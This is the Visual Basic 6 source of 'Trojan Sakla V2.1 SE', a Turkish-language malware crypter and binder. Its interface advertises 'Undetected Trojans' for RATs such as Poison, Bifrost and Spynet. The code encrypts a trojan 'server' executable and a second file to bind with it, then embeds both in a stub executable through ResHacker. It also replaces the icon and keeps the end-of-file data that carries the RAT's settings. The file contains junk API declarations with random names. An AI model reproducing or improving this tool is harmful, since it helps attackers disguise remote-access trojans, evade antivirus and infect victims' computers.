VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "ComDlg32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00404040&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Trojan Sakla V2.1 SE [TrojanSakla.Net]"
   ClientHeight    =   4905
   ClientLeft      =   45
   ClientTop       =   540
   ClientWidth     =   4575
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   162
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   ForeColor       =   &H80000001&
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   4905
   ScaleWidth      =   4575
   StartUpPosition =   2  'CenterScreen
   Begin Editor.chameleonButton chameleonButton1 
      Height          =   375
      Left            =   2040
      TabIndex        =   18
      Top             =   4440
      Width           =   1095
      _ExtentX        =   1931
      _ExtentY        =   661
      BTYPE           =   5
      TX              =   "About"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   1
      FOCUSR          =   -1  'True
      BCOL            =   14737632
      BCOLO           =   16777152
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":2982
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.TextBox txtIcon 
      Appearance      =   0  'Flat
      BackColor       =   &H00808080&
      ForeColor       =   &H00E0E0E0&
      Height          =   285
      Left            =   480
      Locked          =   -1  'True
      TabIndex        =   17
      Top             =   3240
      Width           =   2655
   End
   Begin VB.Frame Frame4 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      Caption         =   "Simge Seç"
      ForeColor       =   &H00C0C0C0&
      Height          =   615
      Left            =   0
      TabIndex        =   15
      Top             =   3000
      Width           =   4455
      Begin Editor.chameleonButton cmd 
         Height          =   255
         Index           =   2
         Left            =   3240
         TabIndex        =   16
         Top             =   240
         Width           =   1095
         _ExtentX        =   1931
         _ExtentY        =   450
         BTYPE           =   5
         TX              =   "Icon"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   14737632
         BCOLO           =   12648447
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "Form1.frx":299E
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Image Image1 
         Height          =   270
         Index           =   5
         Left            =   120
         Picture         =   "Form1.frx":29BA
         Top             =   240
         Width           =   270
      End
   End
   Begin Editor.chameleonButton butn 
      Height          =   270
      Left            =   2640
      TabIndex        =   11
      Top             =   5640
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   476
      BTYPE           =   5
      TX              =   "About"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   14869218
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":2FB4
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.CheckBox ChkEOF 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      Caption         =   "EOF"
      BeginProperty Font 
         Name            =   "Small Fonts"
         Size            =   6.75
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   315
      Left            =   120
      TabIndex        =   10
      Top             =   4560
      Value           =   1  'Checked
      Width           =   855
   End
   Begin Editor.chameleonButton cmd 
      Height          =   255
      Index           =   4
      Left            =   3240
      TabIndex        =   9
      Top             =   2520
      Width           =   1095
      _ExtentX        =   1931
      _ExtentY        =   450
      BTYPE           =   5
      TX              =   "..."
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   14869218
      BCOLO           =   12648447
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":2FD0
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Editor.chameleonButton cmd 
      Height          =   375
      Index           =   3
      Left            =   3240
      TabIndex        =   8
      Top             =   4440
      Width           =   1095
      _ExtentX        =   1931
      _ExtentY        =   661
      BTYPE           =   5
      TX              =   "Crypt"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   14869218
      BCOLO           =   16777152
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":2FEC
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Editor.chameleonButton cmd 
      Height          =   255
      Index           =   1
      Left            =   3240
      TabIndex        =   7
      Top             =   3960
      Width           =   1095
      _ExtentX        =   1931
      _ExtentY        =   450
      BTYPE           =   5
      TX              =   "Genarate"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   14869218
      BCOLO           =   12648447
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":3008
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Editor.chameleonButton cmd 
      Height          =   255
      Index           =   0
      Left            =   3240
      TabIndex        =   6
      Top             =   1800
      Width           =   1095
      _ExtentX        =   1931
      _ExtentY        =   450
      BTYPE           =   5
      TX              =   "...."
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   12632256
      BCOLO           =   12648447
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   255
      MPTR            =   1
      MICON           =   "Form1.frx":3024
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.Frame Frame3 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      Caption         =   "Sifreleme"
      ForeColor       =   &H00C0C0C0&
      Height          =   615
      Left            =   0
      TabIndex        =   4
      Top             =   3720
      Width           =   4455
      Begin VB.TextBox txtKey 
         Appearance      =   0  'Flat
         BackColor       =   &H00808080&
         ForeColor       =   &H00E0E0E0&
         Height          =   285
         Left            =   480
         Locked          =   -1  'True
         TabIndex        =   5
         Top             =   240
         Width           =   2655
      End
      Begin VB.Image Image1 
         DragIcon        =   "Form1.frx":3040
         Height          =   270
         Index           =   3
         Left            =   120
         Picture         =   "Form1.frx":59C2
         Top             =   240
         Width           =   270
      End
   End
   Begin VB.Frame Frame2 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      Caption         =   "Binlestirilecek Dosyaniz"
      ForeColor       =   &H00C0C0C0&
      Height          =   615
      Left            =   0
      TabIndex        =   2
      Top             =   2280
      Width           =   4455
      Begin VB.TextBox txtBind 
         Appearance      =   0  'Flat
         BackColor       =   &H00808080&
         ForeColor       =   &H00E0E0E0&
         Height          =   285
         Left            =   480
         Locked          =   -1  'True
         TabIndex        =   3
         Top             =   240
         Width           =   2655
      End
      Begin VB.Image Image1 
         Height          =   270
         Index           =   2
         Left            =   120
         Picture         =   "Form1.frx":5FBC
         Top             =   240
         Width           =   270
      End
   End
   Begin VB.Frame Frame1 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      Caption         =   "Server Dosyaniz"
      ForeColor       =   &H00C0C0C0&
      Height          =   615
      Left            =   0
      TabIndex        =   0
      Top             =   1560
      Width           =   4455
      Begin VB.TextBox txtFile 
         Appearance      =   0  'Flat
         BackColor       =   &H00808080&
         ForeColor       =   &H00E0E0E0&
         Height          =   285
         Left            =   480
         Locked          =   -1  'True
         TabIndex        =   1
         Top             =   240
         Width           =   2655
      End
      Begin VB.Image Image1 
         Height          =   270
         Index           =   1
         Left            =   120
         Picture         =   "Form1.frx":65B6
         Top             =   240
         Width           =   270
      End
   End
   Begin MSComDlg.CommonDialog CD1 
      Left            =   1200
      Top             =   6000
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin Editor.chameleonButton cmd 
      Height          =   255
      Index           =   5
      Left            =   3240
      TabIndex        =   14
      Top             =   3240
      Width           =   1095
      _ExtentX        =   1931
      _ExtentY        =   450
      BTYPE           =   5
      TX              =   "..."
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   14869218
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":6BB0
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.Label Label1 
      BackColor       =   &H00404040&
      Caption         =   "Poison, Bifrost, Flux, Painrat, Spynet..."
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   480
      TabIndex        =   13
      Top             =   5400
      Width           =   2775
   End
   Begin VB.Label Label3 
      BackColor       =   &H00404040&
      Caption         =   "Undetected Trojans"
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   1200
      TabIndex        =   12
      Top             =   5160
      Width           =   1575
   End
   Begin VB.Image Image1 
      Height          =   225
      Index           =   4
      Left            =   4200
      Picture         =   "Form1.frx":6BCC
      Top             =   1200
      Width           =   360
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00E0E0E0&
      X1              =   0
      X2              =   4560
      Y1              =   1440
      Y2              =   1440
   End
   Begin VB.Image Image1 
      Height          =   1425
      Index           =   0
      Left            =   0
      Picture         =   "Form1.frx":7071
      Top             =   0
      Width           =   4575
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Sub ok1q8n5ha5yfmd Lib "n1m4sq2na2bgip" ()
Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
Private Declare Sub tp1v1ss5fse4ri Lib "sr16xv3sfig5nu" ()
Private noTest As CRijndael
Private Declare Sub pn11js2mkfuy9y Lib "bl1o7nd3hhj8xc" ()
Private Sub butn_Click()
Form4.Show
End Sub



Private Sub chameleonButton1_Click()
Form4.Show
End Sub

Private Sub Cmd_Click(Index As Integer)
Select Case Index
Case 0
CD1.CancelError = False
CD1.Filter = "EXE|*.EXE"
CD1.ShowOpen
If CD1.FileName = Empty Then Exit Sub
txtFile = CD1.FileName
CD1.FileName = Empty

Case 1
GetRandomKey

Case 2
CD1.CancelError = False
CD1.Filter = "ICO|*.ICO"
CD1.ShowOpen
If CD1.FileName = Empty Then Exit Sub
txtIcon = CD1.FileName
CD1.FileName = Empty

Case 3
Dim nereye As String, sifrelendi As String
CD1.CancelError = False
CD1.Filter = "EXE|*.EXE"
CD1.ShowSave
If CD1.FileName = Empty Then Exit Sub
nereye = CD1.FileName
CD1.FileName = Empty

CopyFile App.Path & "\tools\stub.exe", nereye, 0
sifrelendi = strEncrypt(LoadFile(txtFile), txtKey)
Open App.Path & "\Crypting" For Binary As #1
Put #1, , sifrelendi
Close #1

sifrelendi = strEncrypt(LoadFile(txtBind), txtKey)
Open App.Path & "\Binding" For Binary As #1
Put #1, , sifrelendi
Close #1

Open App.Path & "\Settings" For Binary As #1
Put #1, , txtKey.Text
Close #1
ResEkle nereye, App.Path & "\Crypting", "INFO", "FILE"
ResEkle nereye, App.Path & "\Binding", "INFO", "BFILE"
ResEkle nereye, App.Path & "\Settings", "INFO", "SETTINGS"
Kill App.Path & "\Crypting"
Kill App.Path & "\Binding"
Kill App.Path & "\Settings"
If txtIcon <> vbNullString Then IconDegistir nereye, txtIcon
If ChkEOF.Value = 1 And ReadEOFData(txtFile) <> vbNullString Then
WriteEOFData nereye, ReadEOFData(txtFile)
End If

MsgBox "Basarili"
Case 4
CD1.CancelError = False
CD1.Filter = "EXE|*.EXE"
CD1.ShowOpen
If CD1.FileName = Empty Then Exit Sub
txtBind = CD1.FileName
CD1.FileName = Empty

End Select
End Sub

Private Sub Form_Load()
Dim di As DRIVE_INFO
di = GetDriveInfo(0)
'If Trim$(di.SerialNumber) <> "S0D4J1MPB00435" Then Unload Me
GetRandomKey
End Sub

Private Function IconDegistir(Dosya As String, Icon As String)
Call Shell(App.Path & "\tools\ResHacker.exe -addoverwrite " & Dosya & Chr(44) & Dosya & Chr(44) & Icon & Chr(44) & "ICONGROUP,1,0")
End Function

Private Function ResEkle(File As String, Res As String, ResType As String, ResID As String)
Call Shell(App.Path & "\tools\ResHacker.exe -addoverwrite " & File & Chr(44) & File & Chr(44) & Res & Chr(44) & ResType & Chr(44) & ResID & Chr(44) & "0")
End Function



Private Function RandomNumber() As Integer
    Randomize
    var1 = Int(9 * Rnd)
    RandomNumber = var1
End Function

Private Function RandomLetter() As String
Anfang:
    Keyset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    Randomize
    var1 = Int(26 * Rnd)
    If var1 = 0 Then GoTo Anfang
    RandomLetter = Mid(Keyset, var1, 1)
End Function

Private Function GetRandomKey()
Dim i As Long
    txtKey = ""
    For i = 1 To 20
        If i = 2 Or i = 4 Or i = 6 Then
            txtKey = txtKey & RandomNumber
        Else
            txtKey = txtKey & RandomLetter
        End If
    Next i
End Function

Private Function LoadFile(sPath As String) As String
    Dim lFileSize As Long
    Dim sData As String
    Dim FF As Integer
    FF = FreeFile
    On Error Resume Next
    Open sPath For Binary Access Read As #FF
    lFileSize = LOF(FF)
    sData = Input$(lFileSize, FF)
    Close #FF
    LoadFile = sData
End Function

Public Function ReadEOFData(sFilePath As String) As String
On Error GoTo Err:
Dim sFileBuf As String, sEOFBuf As String, sChar As String
Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
If Dir(sFilePath) = "" Then GoTo Err:
lFF = FreeFile
Open sFilePath For Binary As #lFF
sFileBuf = Space(LOF(lFF))
Get #lFF, , sFileBuf
Close #lFF
lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
ReadEOFData = StrReverse(sEOFBuf)
If ReadEOFData = "" Then
End If
Exit Function
Err:
ReadEOFData = vbNullString
End Function

Sub WriteEOFData(sFilePath As String, sEOFData As String)
Dim sFileBuf As String
Dim lFF As Long
On Error Resume Next
If Dir(sFilePath) = "" Then Exit Sub
lFF = FreeFile
Open sFilePath For Binary As #lFF
sFileBuf = Space(LOF(lFF))
Get #lFF, , sFileBuf
Close #lFF
Kill sFilePath
lFF = FreeFile
Open sFilePath For Binary As #lFF
Put #lFF, , sFileBuf & sEOFData
Close #lFF
End Sub

Public Function GetNullBytes(lNum) As String
Dim sBuf As String
Dim i As Integer
For i = 1 To lNum
sBuf = sBuf & Chr(0)
Next
GetNullBytes = sBuf
End Function


Private Function strEncrypt(ByVal strMsg As String, ByVal pKey As String) As String
Dim ByteArray() As Byte, byteKey() As Byte, CryptText() As Byte
On Local Error Resume Next
Set oTest = New CRijndael
ByteArray() = StrConv(strMsg, vbFromUnicode)
byteKey() = StrConv(pKey, vbFromUnicode)
CryptText() = oTest.EncryptData(ByteArray(), byteKey())
Set oTest = Nothing
strEncrypt = StrConv(CryptText(), vbUnicode)
End Function

